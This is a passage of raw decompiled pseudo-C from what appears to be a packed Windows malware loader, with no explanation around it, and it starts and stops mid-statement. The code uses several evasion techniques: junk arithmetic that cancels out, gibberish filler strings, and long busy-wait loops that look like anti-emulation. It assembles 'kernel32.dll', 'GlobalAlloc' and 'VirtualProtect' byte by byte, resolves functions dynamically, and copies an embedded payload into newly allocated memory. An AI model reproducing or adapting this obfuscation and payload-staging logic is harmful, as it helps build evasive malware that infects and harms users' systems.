fcn.00406eb6(\"diduxefacavuvabigu mimeraraxopuzamohovugotevepi\");\n            *(unaff_EBP + -4) = 2;\n            fcn.00408e6d(unaff_EBP + -0x1c0);\n            *(unaff_EBP + -4) = 1;\n            fcn.00405fd6(1, 0);\n            fcn.00406eb6(\n                        \"kaxiro xavoyoxegi kacuvehuxisusejaxurefita virahi ju doluwajuroli totikodipufu kiruzavihucoluzijayojofeki hocanahitulolebozixozoya\"\n                        );\n            *(unaff_EBP + -4) = 3;\n            fcn.00408e6d(unaff_EBP + -0x1c0);\n            *(unaff_EBP + -4) = 1;\n            fcn.00405fd6(1, 0);\n            fcn.004086d1();\n            fcn.00408081();\n            fcn.0040a4d6(0x443968, \n                         \"rasirisedojezamabagegame dakoberici beronokifaminanoluxo dagulonovo gotawelayesozulabikenirazoca covebuwikosemaboguwulevoze jozojudonumexufabayu jucibivuruta xifiheda %f\"\n                         , \"wowusaroyowakumifi\");\n            *(unaff_EBP + -4) = 0;\n            fcn.00408052();\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00405dc6();\n            fcn.00404e32();\n        }\n        iVar4 = 0;\n        do {\n            (*_sym.imp.KERNEL32.dll_GetCPInfo)(0, unaff_EBP + -0x1a0);\n            (*_sym.imp.USER32.dll_GetMenuInfo)(0, unaff_EBP + -0x1c0);\n            if (((0xda2de0 < iVar4) && (*(unaff_EBP + -0x1a0) != 0x229ad697)) && (*(unaff_EBP + -0x1ac) != 0x5457ef65))\n            break;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x2881c1fa);\n        *0x4b90e4 = *0x440118 + 0x4defc;\n        *0x4b48c3 = 0x6c;\n        *(unaff_EBP + -0xe8) = 0;\n        *(unaff_EBP + -0xe8) = *(unaff_EBP + -0xe8) + -0x75caffca;\n        *(unaff_EBP + -0xe8) = *(unaff_EBP + -0xe8) + 0x47014a04;\n        *(unaff_EBP + -0xe8) = *(unaff_EBP + -0xe8) + -0x3acdf792;\n        *(unaff_EBP + -0xe8) = *(unaff_EBP + -0xe8) + 0x6997ad58;\n        *(unaff_EBP + -0xe8) = *(unaff_EBP + -0xe8) + -0x205a4c06;\n        *0x4b50b0 = *(unaff_EBP + -0xe8);\n        *0x4b50b4 = *0x4b50b0 >> 0x1f;\n        *0x4b48bd = 0x6c;\n        *(unaff_EBP + -0x178) = 0;\n        *(unaff_EBP + -0x178) = *(unaff_EBP + -0x178) + -0x44f5979c;\n        *(unaff_EBP + -0x178) = *(unaff_EBP + -0x178) + 0x27053852;\n        *(unaff_EBP + -0x178) = *(unaff_EBP + -0x178) + 0x1df05f4a;\n        *(unaff_EBP + -0x178) = *(unaff_EBP + -0x178) + -0x447c85ac;\n        *(unaff_EBP + -0x178) = *(unaff_EBP + -0x178) + 0x27b64272;\n        *(unaff_EBP + -0x178) = *(unaff_EBP + -0x178) + 0xe9faf4;\n        *(unaff_EBP + -0x178) = *(unaff_EBP + -0x178) + -0xce3f91c;\n        *(unaff_EBP + -0x178) = *(unaff_EBP + -0x178) + -0x545a1c44;\n        *(unaff_EBP + -0x178) = *(unaff_EBP + -0x178) + 0x7d1a5da6;\n        *0x4b26c4 = *(unaff_EBP + -0x178);\n        *0x4b48c2 = 0x6c;\n        *(unaff_EBP + -0x174) = 0x8856212c;\n        *(unaff_EBP + -0x174) = *(unaff_EBP + -0x174) + 0x77a9ded4;\n        *(unaff_EBP + -0x174) = *(unaff_EBP + -0x174) + -0xf30a56e;\n        *(unaff_EBP + -0x174) = *(unaff_EBP + -0x174) + 0xf30a56e;\n        *(unaff_EBP + -0x174) = *(unaff_EBP + -0x174) + -0x1c6bc36;\n        *(unaff_EBP + -0x174) = *(unaff_EBP + -0x174) + 0x1c6bc36;\n        *(unaff_EBP + -0x174) = *(unaff_EBP + -0x174) + -0x14899378;\n        *(unaff_EBP + -0x174) = *(unaff_EBP + -0x174) + -0x34c70cee;\n        *(unaff_EBP + -0x174) = *(unaff_EBP + -0x174) + 0x1055e1f8;\n        *0x4b7414 = *(unaff_EBP + -0x174);\n        *0x4b48c0 = 0x2e;\n        *(unaff_EBP + -0x104) = 0;\n        *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + -0x72d1748;\n        *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + 0x72d1748;\n        *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + -0x40a3e2be;\n        *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + 0x40a3e2be;\n        *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + -0x34c790d6;\n        *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + 0x34c790d6;\n        *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + -0x37b0f6a0;\n        *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + -0x1deab83e;\n        *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + -0x1d82c6ec;\n        *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + 0x314b357c;\n        *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + 0x41d3404e;\n        *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + -0x6a9ddedc;\n        *0x442364 = *(unaff_EBP + -0x104);\n        *0x4b48be = 0x33;\n        *(unaff_EBP + -0xe0) = 0;\n        *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + -0x21c5d004;\n        *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + 0x21c5d004;\n        *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + -0x103e1bca;\n        *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + 0x103e1bca;\n        *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + -0x3e5c16d8;\n        *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + 0x388b145e;\n        *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + -0x3f8fb40c;\n        *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + 0x4560b686;\n        *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + -0x434abbb4;\n        *0x4b90e0 = *(unaff_EBP + -0xe0);\n        *0x4b48bb = 0x6e;\n        *(unaff_EBP + -0x134) = 0;\n        *(unaff_EBP + -0x134) = *(unaff_EBP + -0x134) + -0x48b97bae;\n        *(unaff_EBP + -0x134) = *(unaff_EBP + -0x134) + -0x2d40c684;\n        *(unaff_EBP + -0x134) = *(unaff_EBP + -0x134) + 0x3bee05fe;\n        *(unaff_EBP + -0x134) = *(unaff_EBP + -0x134) + -0x1daa9006;\n        *(unaff_EBP + -0x134) = *(unaff_EBP + -0x134) + 0x2a5251b2;\n        *(unaff_EBP + -0x134) = *(unaff_EBP + -0x134) + 0x2d647a88;\n        *(unaff_EBP + -0x134) = *(unaff_EBP + -0x134) + -0x73a4e00e;\n        *0x4b5060 = *(unaff_EBP + -0x134);\n        *0x4b48bf = 0x32;\n        *(unaff_EBP + -0x124) = 0xe959b9be;\n        *(unaff_EBP + -0x124) = *(unaff_EBP + -0x124) + 0x16a64642;\n        *(unaff_EBP + -0x124) = *(unaff_EBP + -0x124) + -0x7e3b1062;\n        *(unaff_EBP + -0x124) = *(unaff_EBP + -0x124) + 0x7e3b1062;\n        *0x4d22d8 = *(unaff_EBP + -0x124);\n        *0x4b48ba = 0x72;\n        *(unaff_EBP + -0x13c) = 0;\n        *(unaff_EBP + -0x13c) = *(unaff_EBP + -0x13c) + -0x257a8;\n        *(unaff_EBP + -0x13c) = *(unaff_EBP + -0x13c) + 0x257a8;\n        *0x4b73ec = *(unaff_EBP + -0x13c);\n        *0x4b48b8 = 0x6b;\n        *(unaff_EBP + -0xf8) = 0xaba4467c;\n        *(unaff_EBP + -0xf8) = *(unaff_EBP + -0xf8) + 0x545bb984;\n        *(unaff_EBP + -0xf8) = *(unaff_EBP + -0xf8) + -0x24c7db7e;\n        *(unaff_EBP + -0xf8) = *(unaff_EBP + -0xf8) + 0x2499c7f0;\n        *(unaff_EBP + -0xf8) = *(unaff_EBP + -0xf8) + 0x2e138e;\n        *0x4b50bc = *(unaff_EBP + -0xf8);\n        *0x4b48c1 = 100;\n        *(unaff_EBP + -0x16c) = 0;\n        *(unaff_EBP + -0x16c) = *(unaff_EBP + -0x16c) + -0x778bf514;\n        *(unaff_EBP + -0x16c) = *(unaff_EBP + -0x16c) + 0x778bf514;\n        *0x4b26d0 = *(unaff_EBP + -0x16c);\n        *0x4b48b9 = 0x65;\n        *0x4b504c = 0;\n        *0x4b48bc = 0x65;\n        *(unaff_EBP + -300) = 0xbf5b0dd0;\n        *(unaff_EBP + -300) = *(unaff_EBP + -300) + 0x40a4f230;\n        *(unaff_EBP + -300) = *(unaff_EBP + -300) + -0x30b126d0;\n        *(unaff_EBP + -300) = *(unaff_EBP + -300) + 0x30b126d0;\n        pcVar2 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n        *0x4d22d4 = *(unaff_EBP + -300);\n        *0x4b48c4 = 0;\n        *0x4b7478 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4b48b8);\n        *0x4af0aa = 0x6f;\n        *(unaff_EBP + -0x130) = 0;\n        *(unaff_EBP + -0x130) = *(unaff_EBP + -0x130) + -0x18908a04;\n        *(unaff_EBP + -0x130) = *(unaff_EBP + -0x130) + 0xdabff02;\n        *(unaff_EBP + -0x130) = *(unaff_EBP + -0x130) + -0x597066ae;\n        *(unaff_EBP + -0x130) = *(unaff_EBP + -0x130) + 0x2117c572;\n        *(unaff_EBP + -0x130) = *(unaff_EBP + -0x130) + 0x15f0bb42;\n        *(unaff_EBP + -0x130) = *(unaff_EBP + -0x130) + 0x2d4c70fc;\n        *(unaff_EBP + -0x130) = *(unaff_EBP + -0x130) + -0x57ebd478;\n        *(unaff_EBP + -0x130) = *(unaff_EBP + -0x130) + -0x5645c90;\n        *(unaff_EBP + -0x130) = *(unaff_EBP + -0x130) + 0x5d503108;\n        *0x4b746c = *(unaff_EBP + -0x130);\n        *0x4af0a9 = 0x6c;\n        *(unaff_EBP + -0x164) = 0;\n        *(unaff_EBP + -0x164) = *(unaff_EBP + -0x164) + -0x435ec03e;\n        *(unaff_EBP + -0x164) = *(unaff_EBP + -0x164) + 0x435ec03e;\n        *(unaff_EBP + -0x164) = *(unaff_EBP + -0x164) + -0x70f3d2e2;\n        *(unaff_EBP + -0x164) = *(unaff_EBP + -0x164) + 0x2537e846;\n        *(unaff_EBP + -0x164) = *(unaff_EBP + -0x164) + 0x4bbbea9c;\n        *0x4b26c8 = *(unaff_EBP + -0x164);\n        *0x4af0af = 0x6c;\n        *(unaff_EBP + -0x154) = 0xcf09cbfe;\n        *(unaff_EBP + -0x154) = *(unaff_EBP + -0x154) + 0x30f63402;\n        *(unaff_EBP + -0x154) = *(unaff_EBP + -0x154) + -0x6bc3d7a0;\n        *0x456400 = *(unaff_EBP + -0x154);\n        *0x456404 = *0x456400 >> 0x1f;\n        *0x4af0ab = 0x62;\n        *(unaff_EBP + -0x11c) = 0;\n        *(unaff_EBP + -0x11c) = *(unaff_EBP + -0x11c) + -0x37dcc94a;\n        *(unaff_EBP + -0x11c) = *(unaff_EBP + -0x11c) + 0x37dcc94a;\n        *(unaff_EBP + -0x11c) = *(unaff_EBP + -0x11c) + -0x38bcd88;\n        *(unaff_EBP + -0x11c) = *(unaff_EBP + -0x11c) + 0x38bcd88;\n        *(unaff_EBP + -0x11c) = *(unaff_EBP + -0x11c) + -0x6461e920;\n        *(unaff_EBP + -0x11c) = *(unaff_EBP + -0x11c) + 0x6461e920;\n        *(unaff_EBP + -0x11c) = *(unaff_EBP + -0x11c) + -0x5c263f8e;\n        *0x4b26ac = *(unaff_EBP + -0x11c);\n        *0x4af0ae = 0x41;\n        *(unaff_EBP + -0x188) = 0xb4205532;\n        *(unaff_EBP + -0x188) = *(unaff_EBP + -0x188) + 0x4bdfaace;\n        *(unaff_EBP + -0x188) = *(unaff_EBP + -0x188) + -0x1d607cc6;\n        *(unaff_EBP + -0x188) = *(unaff_EBP + -0x188) + 0x19ac8b18;\n        *(unaff_EBP + -0x188) = *(unaff_EBP + -0x188) + 0x3b3f1ae;\n        *(unaff_EBP + -0x188) = *(unaff_EBP + -0x188) + -0x1be2760c;\n        *0x4b7410 = *(unaff_EBP + -0x188);\n        *0x4af0b1 = 0x6f;\n        *(unaff_EBP + -0x17c) = 0xe7f9968e;\n        *(unaff_EBP + -0x17c) = *(unaff_EBP + -0x17c) + 0x18066972;\n        *(unaff_EBP + -0x17c) = *(unaff_EBP + -0x17c) + -0x10366e46;\n        *(unaff_EBP + -0x17c) = *(unaff_EBP + -0x17c) + 0x10366e46;\n        *(unaff_EBP + -0x17c) = *(unaff_EBP + -0x17c) + -0x5d5d739e;\n        *(unaff_EBP + -0x17c) = *(unaff_EBP + -0x17c) + -0x229e6b4;\n        *(unaff_EBP + -0x17c) = *(unaff_EBP + -0x17c) + -0x17f036fc;\n        *0x4b745c = *(unaff_EBP + -0x17c);\n        *0x4af0b0 = 0x6c;\n        *(unaff_EBP + -0xec) = 0xc7f478a8;\n        *(unaff_EBP + -0xec) = *(unaff_EBP + -0xec) + 0x380b8758;\n        *(unaff_EBP + -0xec) = *(unaff_EBP + -0xec) + -0xa6b6516;\n        *(unaff_EBP + -0xec) = *(unaff_EBP + -0xec) + 0xa6b6516;\n        *0x4b2650 = *(unaff_EBP + -0xec);\n        *0x4af0a8 = 0x47;\n        *(unaff_EBP + -0x148) = 0xf51f80b8;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + -0x4920b564;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + -0x18442b90;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + 0x6c45603c;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + -0x42ec4938;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + 0x42ec4938;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + -0x66e36628;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + 0x1954a6da;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + -0x1cae1db6;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + 0x6a3cdd04;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + -0x462ac0;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + 0x462ac0;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + -0x3daa05fe;\n        *(unaff_EBP + -0x148) = *(unaff_EBP + -0x148) + 0x3daa05fe;\n        *0x4b7568 = *(unaff_EBP + -0x148);\n        *0x4af0b2 = 99;\n        *(unaff_EBP + -0x110) = 0xa9fd3fa0;\n        *(unaff_EBP + -0x110) = *(unaff_EBP + -0x110) + 0x5602c060;\n        *(unaff_EBP + -0x110) = *(unaff_EBP + -0x110) + -0x74ae8d4;\n        *0x4d22b0 = *(unaff_EBP + -0x110);\n        *0x4d22b4 = *0x4d22b0 >> 0x1f;\n        *0x4af0ad = 0x6c;\n        *(unaff_EBP + -0x184) = 0xd7544b28;\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -0x1fd58354;\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 0x46df6efc;\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -0x61cb0dac;\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 0x5dcf8764;\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 0x59d4f78;\n        *0x4b50c0 = *(unaff_EBP + -0x184);\n        *0x4af0ac = 0x61;\n        *(unaff_EBP + -0x160) = 0xcc5d4782;\n        *(unaff_EBP + -0x160) = *(unaff_EBP + -0x160) + -0x4b86a3b6;\n        *(unaff_EBP + -0x160) = *(unaff_EBP + -0x160) + 0x7f295c34;\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        *0x4b2654 = *(unaff_EBP + -0x160);\n        *0x4af0b3 = 0;\n        iVar4 = 0;\n        do {\n            if (iVar4 == 0xd6acc) {\n                *0x4b5074 = (*pcVar1)(*0x4b7478, 0x4af0a8);\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x19bd0c);\n        *0x4b5030 = (**0x4b5074)(0, *0x4b90e4);\n        *0x4d22c0 = *0x423008;\n        uVar3 = 0;\n        if (*0x4b90e4 != 0) {\n            do {\n                *(*0x4b5030 + uVar3) = *(*0x4d22c0 + 0x4defc + uVar3);\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < *0x4b90e4);\n        }\n        fcn.00401393();\n        *(unaff_EBP + -0xd8) = 0;\n        *(unaff_EBP + -0xd8) = *(unaff_EBP + -0xd8) + 0x40;\n        *0x4b748b = 0x6c;\n        *(unaff_EBP + -0xfc) = 0xd9d10ed4;\n        *(unaff_EBP + -0xfc) = *(unaff_EBP + -0xfc) + 0x262ef12c;\n        *(unaff_EBP + -0xfc) = *(unaff_EBP + -0xfc) + -0x6b8471a2;\n        *(unaff_EBP + -0xfc) = *(unaff_EBP + -0xfc) + 0x6b8471a2;\n        *(unaff_EBP + -0xfc) = *(unaff_EBP + -0xfc) + -0x771885f0;\n        *(unaff_EBP + -0xfc) = *(unaff_EBP + -0xfc) + 0x771885f0;\n        *(unaff_EBP + -0xfc) = *(unaff_EBP + -0xfc) + -0x1c9a1ca8;\n        *0x4b5098 = *(unaff_EBP + -0xfc);\n        *0x4b748a = 0x6c;\n        *0x4b7428 = 0;\n        *0x4b742c = 0;\n        *0x4b7483 = 0x6e;\n        *(unaff_EBP + -0x114) = 0xd274f36a;\n        *(unaff_EBP + -0x114) = *(unaff_EBP + -0x114) + -0x1001a23a;\n        *(unaff_EBP + -0x114) = *(unaff_EBP + -0x114) + 0x3d8caed0;\n        *(unaff_EBP + -0x114) = *(unaff_EBP + -0x114) + -0x6318c662;\n        *(unaff_EBP + -0x114) = *(unaff_EBP + -0x114) + 0x5ecc8736;\n        *(unaff_EBP + -0x114) = *(unaff_EBP + -0x114) + 0x44c3f2c;\n        *(unaff_EBP + -0x114) = *(unaff_EBP + -0x114) + -0x5b634ff0;\n        *(unaff_EBP + -0x114) = *(unaff_EBP + -0x114) + 0x5b634ff0;\n        *(unaff_EBP + -0x114) = *(unaff_EBP + -0x114) + -0x4046a158;\n        *(unaff_EBP + -0x114) = *(unaff_EBP + -0x114) + 0x4046a158;\n        *0x442378 = *(unaff_EBP + -0x114);\n        *0x44237c = *0x442378 >> 0x1f;\n        *0x4b7486 = 0x33;\n        *(unaff_EBP + -0x158) = 0xeb7471c0;\n        *(unaff_EBP + -0x158) = *(unaff_EBP + -0x158) + 0x148b8e40;\n        *0x4acea4 = *(unaff_EBP + -0x158);\n        *0x4b7481 = 0x65;\n        *(unaff_EBP + -0xe4) = 0xce5148f4;\n        *(unaff_EBP + -0xe4) = *(unaff_EBP + -0xe4) + -0x3f19714e;\n        *(unaff_EBP + -0xe4) = *(unaff_EBP + -0xe4) + 0x70c8285a;\n        *(unaff_EBP + -0xe4) = *(unaff_EBP + -0xe4) + -0x3277c5d0;\n        *(unaff_EBP + -0xe4) = *(unaff_EBP + -0xe4) + -0x3af17120;\n        *(unaff_EBP + -0xe4) = *(unaff_EBP + -0xe4) + 0x1434edb0;\n        *(unaff_EBP + -0xe4) = *(unaff_EBP + -0xe4) + -0x9bcff88;\n        *(unaff_EBP + -0xe4) = *(unaff_EBP + -0xe4) + 0x62f148c8;\n        *(unaff_EBP + -0xe4) = *(unaff_EBP + -0xe4) + -0x5879fb56;\n        *0x4b50a0 = *(unaff_EBP + -0xe4);\n        *0x4b7484 = 0x65;\n        *(unaff_EBP + -0xf0) = 0;\n        *(unaff_EBP + -0xf0) = *(unaff_EBP + -0xf0) + -0xb2b8afe;\n        *(unaff_EBP + -0xf0) = *(unaff_EBP + -0xf0) + 0xb2b8afe;\n        *(unaff_EBP + -0xf0) = *(unaff_EBP + -0xf0) + -0x6a6a3398;\n        *(unaff_EBP + -0xf0) = *(unaff_EBP + -0xf0) + -0x280fbc8;\n        *(unaff_EBP + -0xf0) = *(unaff_EBP + -0xf0) + 0x3afb55ca;\n        *(unaff_EBP + -0xf0) = *(unaff_EBP + -0xf0) + -0x4b84e9c2;\n        *(unaff_EBP + -0xf0) = *(unaff_EBP + -0xf0) + 0x5f6d4f12;\n        *(unaff_EBP + -0xf0) = *(unaff_EBP + -0xf0) + 0x1e077446;\n        *0x4b7430 = *(unaff_EBP + -0xf0);\n        *0x4b7434 = *0x4b7430 >> 0x1f;\n        *0x4b7482 = 0x72;\n        *(unaff_EBP + -0x150) = 0;\n        *(unaff_EBP + -0x150) = *(unaff_EBP + -0x150) + -0x68290bfc;\n        *(unaff_EBP + -0x150) = *(unaff_EBP + -0x150) + 0x68290bfc;\n        *(unaff_EBP + -0x150) = *(unaff_EBP + -0x150) + -0x65fcd88c;\n        *(unaff_EBP + -0x150) = *(unaff_EBP + -0x150) + 0x6425e6f0;\n        *(unaff_EBP + -0x150) = *(unaff_EBP + -0x150) + 0x1d6f19c;\n        *(unaff_EBP + -0x150) = *(unaff_EBP + -0x150) + -0x280ba1f4;\n        *(unaff_EBP + -0x150) = *(unaff_EBP + -0x150) + 0x1511bd12;\n        *0x45640c = *(unaff_EBP + -0x150);\n        *0x4b7485 = 0x6c;\n        *(unaff_EBP + -0x108) = 0xef7b125e;\n        *(unaff_EBP + -0x108) = *(unaff_EBP + -0x108) + -0x63316f92;\n        *(unaff_EBP + -0x108) = *(unaff_EBP + -0x108) + 0x608d825c;\n        *(unaff_EBP + -0x108) = *(unaff_EBP + -0x108) + -0x49320e14;\n        *(unaff_EBP + -0x108) = *(unaff_EBP + -0x108) + 0x5c5ae8ec;\n        *(unaff_EBP + -0x108) = *(unaff_EBP + -0x108) + -0x7f55d596;\n        *(unaff_EBP + -0x108) = *(unaff_EBP + -0x108) + 0x7f55d596;\n        *0x4b26d8 = *(unaff_EBP + -0x108);\n        *0x4b26dc = *0x4b26d8 >> 0x1f;\n        *0x4b7488 = 0x2e;\n        *(unaff_EBP + -0x100) = 0xf1e6b9aa;\n        *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + -0x710cb1c4;\n        *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + 0x7f25f81a;\n        *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + -0x63f65e16;\n        *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + 0x199062d2;\n        *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + 0x4a65fb44;\n        *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + -0x7b174bb2;\n        *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + 0x7b174bb2;\n        *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + -0xafbac68;\n        *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + 0xafbac68;\n        *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + -0x4592e64;\n        *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + -0x72be1000;\n        *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + 0x62e01a3c;\n        *0x4b7424 = *(unaff_EBP + -0x100);\n        *0x4b7489 = 100;\n        *0x4d22c8 = 0;\n        *0x4b7487 = 0x32;\n        *(unaff_EBP + -0x15c) = 0x84acc666;\n        *(unaff_EBP + -0x15c) = *(unaff_EBP + -0x15c) + 0x60a29348;\n        *(unaff_EBP + -0x15c) = *(unaff_EBP + -0x15c) + 0x1ab0a652;\n        *0x4b5078 = *(unaff_EBP + -0x15c);\n        *0x4b507c = *0x4b5078 >> 0x1f;\n        *0x4b7480 = 0x6b;\n        *(unaff_EBP + -0x18c) = 0x83714754;\n        *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + 0x3c918db2;\n        *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -0x18b0d4a6;\n        *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + 0x58adffa0;\n        *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -0x3cc58ed2;\n        *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + 0x1e6963f0;\n        *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -0x58234112;\n        *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + 0x767f6bf4;\n        *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -0x1eb95018;\n        *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + 0x1eb95018;\n        *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -0x430fe810;\n        *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -0x369da554;\n        *0x4af088 = *(unaff_EBP + -0x18c);\n        *0x4af08c = *0x4af088 >> 0x1f;\n        *0x4b748c = 0;\n        *0x4b7478 = (*pcVar2)(0x4b7480);\n        *0x4aceb3 = 0x65;\n        *(unaff_EBP + -0x128) = 0x894f4120;\n        *(unaff_EBP + -0x128) = *(unaff_EBP + -0x128) + 0x76b0bee0;\n        *0x4d22d0 = *(unaff_EBP + -0x128);\n        *0x4aceaa = 0x72;\n        *(unaff_EBP + -0x120) = 0xfc48a8d6;\n        *(unaff_EBP + -0x120) = *(unaff_EBP + -0x120) + -0x5dfae6f6;\n        *(unaff_EBP + -0x120) = *(unaff_EBP + -0x120) + 0xf5d66;\n        *(unaff_EBP + -0x120) = *(unaff_EBP + -0x120) + 0x21819444;\n        *(unaff_EBP + -0x120) = *(unaff_EBP + -0x120) + -0x85d51c0;\n        *(unaff_EBP + -0x120) = *(unaff_EBP + -0x120) + 0x487e9e36;\n        *0x4b7400 = *(unaff_EBP + -0x120);\n        *0x4b7404 = *0x4b7400 >> 0x1f;\n        *0x4aceae = 0x6c;\n        *(unaff_EBP + -0xdc) = 0xa2f4e7a2;\n        *(unaff_EBP + -0xdc) = *(unaff_EBP + -0xdc) + 0x5d0b185e;\n        *0x4d22cc = *(unaff_EBP + -0xdc);\n        *0x4acead = 0x61;\n        *(unaff_EBP + -0x10c) = 0;\n        *(unaff_EBP + -0x10c) = *(unaff_EBP + -0x10c) + -0x21001598;\n        *(unaff_EBP + -0x10c) = *(unaff_EBP + -0x10c) + -0x882ef40;\n        *(unaff_EBP + -0x10c) = *(unaff_EBP + -0x10c) + -0x303fc74e;\n        *(unaff_EBP + -0x10c) = *(unaff_EBP + -0x10c) + -0x10cea9ce;\n        *(unaff_EBP + -0x10c) = *(unaff_EBP + -0x10c) + 0x4efd09f2;\n        *(unaff_EBP + -0x10c) = *(unaff_EBP + -0x10c) + 0x1b946c02;\n        *(unaff_EBP + -0x10c) = *(unaff_EBP + -0x10c) + -0x24f28b56;\n        *(unaff_EBP + -0x10c) = *(unaff_EBP + -0x10c) + 0x24f28b56;\n        *0x4b73d4 = *(unaff_EBP + -0x10c);\n        *0x4acea8 = 0x56;\n        *(unaff_EBP + -0x140) = 0xb07af898;\n        *(unaff_EBP + -0x140) = *(unaff_EBP + -0x140) + 0x4f850768;\n        *(unaff_EBP + -0x140) = *(unaff_EBP + -0x140) + -0x17734f0;\n        *(unaff_EBP + -0x140) = *(unaff_EBP + -0x140) + -0x4fc744a6;\n        *(unaff_EBP + -0x140) = *(unaff_EBP + -0x140) + 0x3dc5e4fc;\n        *(unaff_EBP + -0x140) = *(unaff_EBP + -0x140) + 0x1378949a;\n        *(unaff_EBP + -0x140) = *(unaff_EBP + -0x140) + -0x40878a2e;\n        *(unaff_EBP + -0x140) = *(unaff_EBP + -0x140) + -0x9c73b3a;\n        *0x442370 = *(unaff_EBP + -0x140);\n        *0x4aceb5 = 0x74;\n        *(unaff_EBP + -0xf4) = 0x8a5eb54c;\n        *(unaff_EBP + -0xf4) = *(unaff_EBP + -0xf4) + 0x75a14ab4;\n        *0x4b73e0 = *(unaff_EBP + -0xf4);\n        *0x4b73e4 = *0x4b73e0 >> 0x1f;\n        *0x4aceb4 = 99;\n        *(unaff_EBP + -0x118) = 0x84edc3ec;\n        *(unaff_EBP + -0x118) = *(unaff_EBP + -0x118) + 0x7b123c14;\n        *(unaff_EBP + -0x118) = *(unaff_EBP + -0x118) + -0x7ab940ac;\n        *(unaff_EBP + -0x118) = *(unaff_EBP + -0x118) + 0x26276ac;\n        *0x4b5064 = *(unaff_EBP + -0x118);\n        *0x4aceb1 = 0x6f;\n        *0x4563e4 = 0;\n        *0x4aceb2 = 0x74;\n        *(unaff_EBP + -0x144) = 0xacd7e86c;\n        *(unaff_EBP + -0x144) = *(unaff_EBP + -0x144) + 0x53281794;\n        *(unaff_EBP + -0x144) = *(unaff_EBP + -0x144) + -0x2a9f5460;\n        *(unaff_EBP + -0x144) = *(unaff_EBP + -0x144) + 0xe568802;\n        *(unaff_EBP + -0x144) = *(unaff_EBP + -0x144) + 0x1c48cc5e;\n        *(unaff_EBP + -0x144) = *(unaff_EBP + -0x144) + -0x632ec16c;\n        *0x4b2658 = *(unaff_EBP + -0x144);\n        *0x4b265c = *0x4b2658 >> 0x1f;\n        *0x4aceb0 = 0x72;\n        *(unaff_EBP + -0x138) = 0xbd05e0a6;\n        *(unaff_EBP + -0x138) = *(unaff_EBP + -0x138) + 0xe5055f8;\n        *(unaff_EBP + -0x138) = *(unaff_EBP + -0x138) + -0x27c26490;\n        *(unaff_EBP + -0x138) = *(unaff_EBP + -0x138) + 0x10af394e;\n        *(unaff_EBP + -0x138) = *(unaff_EBP + -0x138) + 0x358958ca;\n        *(unaff_EBP + -0x138) = *(unaff_EBP + -0x138) + 